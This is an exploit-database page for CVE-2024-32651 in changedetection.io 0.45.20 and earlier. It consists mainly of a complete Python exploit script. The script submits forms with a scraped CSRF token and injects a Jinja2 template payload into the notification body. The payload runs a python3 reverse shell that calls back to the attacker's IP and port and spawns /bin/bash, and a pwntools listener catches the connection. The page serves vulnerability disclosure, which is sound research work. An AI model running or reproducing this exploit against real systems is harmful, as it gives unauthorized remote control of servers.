---
title: changedetection 0.45.20 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2024060026
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-10
fetch_date: 2025-10-06T16:54:20.391826
---

# changedetection 0.45.20 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **changedetection 0.45.20 Remote Code Execution** **2024.06.09**  Credit:  **[Zach Crosman](https://cxsecurity.com/author/Zach%2BCrosman/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-32651](https://cxsecurity.com/cveshow/CVE-2024-32651/ "Click to see CVE-2024-32651")**  CWE: **N/A** | |

# Exploit Title: changedetection <= 0.45.20 Remote Code Execution (RCE)
# Date: 5-26-2024
# Exploit Author: Zach Crosman (zcrosman)
# Vendor Homepage: changedetection.io
# Software Link: https://github.com/dgtlmoon/changedetection.io
# Version: <= 0.45.20
# Tested on: Linux
# CVE : CVE-2024-32651
from pwn import \*
import requests
from bs4 import BeautifulSoup
import argparse
def start\_listener(port):
listener = listen(port)
print(f"Listening on port {port}...")
conn = listener.wait\_for\_connection()
print("Connection received!")
context.newline = b'\r\n'
# Switch to interactive mode
conn.interactive()
def add\_detection(url, listen\_ip, listen\_port, notification\_url=''):
session = requests.Session()
# First request to get CSRF token
request1\_headers = {
"Cache-Control": "max-age=0",
"Upgrade-Insecure-Requests": "1",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "en-US,en;q=0.9",
"Connection": "close"
}
response = session.get(url, headers=request1\_headers)
soup = BeautifulSoup(response.text, 'html.parser')
csrf\_token = soup.find('input', {'name': 'csrf\_token'})['value']
print(f'Obtained CSRF token: {csrf\_token}')
# Second request to submit the form and get the redirect URL
add\_url = f"{url}/form/add/quickwatch"
add\_url\_headers = { # Define add\_url\_headers here
"Origin": url,
"Content-Type": "application/x-www-form-urlencoded"
}
add\_url\_data = {
"csrf\_token": csrf\_token,
"url": "https://reddit.com/r/baseball",
"tags": '',
"edit\_and\_watch\_submit\_button": "Edit > Watch",
"processor": "text\_json\_diff"
}
post\_response = session.post(add\_url, headers=add\_url\_headers, data=add\_url\_data, allow\_redirects=False)
# Extract the URL from the Location header
if 'Location' in post\_response.headers:
redirect\_url = post\_response.headers['Location']
print(f'Redirect URL: {redirect\_url}')
else:
print('No redirect URL found')
return
# Third request to add the changedetection url with ssti in notification config
save\_detection\_url = f"{url}{redirect\_url}"
save\_detection\_headers = { # Define save\_detection\_headers here
"Referer": redirect\_url,
"Cookie": f"session={session.cookies.get('session')}"
}
save\_detection\_data = {
"csrf\_token": csrf\_token,
"url": "https://reddit.com/r/all",
"title": '',
"tags": '',
"time\_between\_check-weeks": '',
"time\_between\_check-days": '',
"time\_between\_check-hours": '',
"time\_between\_check-minutes": '',
"time\_between\_check-seconds": '30',
"filter\_failure\_notification\_send": 'y',
"fetch\_backend": 'system',
"webdriver\_delay": '',
"webdriver\_js\_execute\_code": '',
"method": 'GET',
"headers": '',
"body": '',
"notification\_urls": notification\_url,
"notification\_title": '',
"notification\_body": f"""
{{% for x in ().\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_() %}}
{{% if "warning" in x.\_\_name\_\_ %}}
{{{{x().\_module.\_\_builtins\_\_['\_\_import\_\_']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\\"{listen\_ip}\\",{listen\_port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"/bin/bash\\")'").read()}}}}
{{% endif %}}
{{% endfor %}}
""",
"notification\_format": 'System default',
"include\_filters": '',
"subtractive\_selectors": '',
"filter\_text\_added": 'y',
"filter\_text\_replaced": 'y',
"filter\_text\_removed": 'y',
"trigger\_text": '',
"ignore\_text": '',
"text\_should\_not\_be\_present": '',
"extract\_text": '',
"save\_button": 'Save'
}
final\_response = session.post(save\_detection\_url, headers=save\_detection\_headers, data=save\_detection\_data)
print('Final request made.')
if \_\_name\_\_ == "\_\_main\_\_":
parser = argparse.ArgumentParser(description='Add detection and start listener')
parser.add\_argument('--url', type=str, required=True, help='Base URL of the target site')
parser.add\_argument('--port', type=int, help='Port for the listener', default=4444)
parser.add\_argument('--ip', type=str, required=True, help='IP address for the listener')
parser.add\_argument('--notification', type=str, help='Notification url if you don\'t want to use the system default')
args = parser.parse\_args()
add\_detection(args.url, args.ip, args.port, args.notification)
start\_listener(args.port)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060026)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top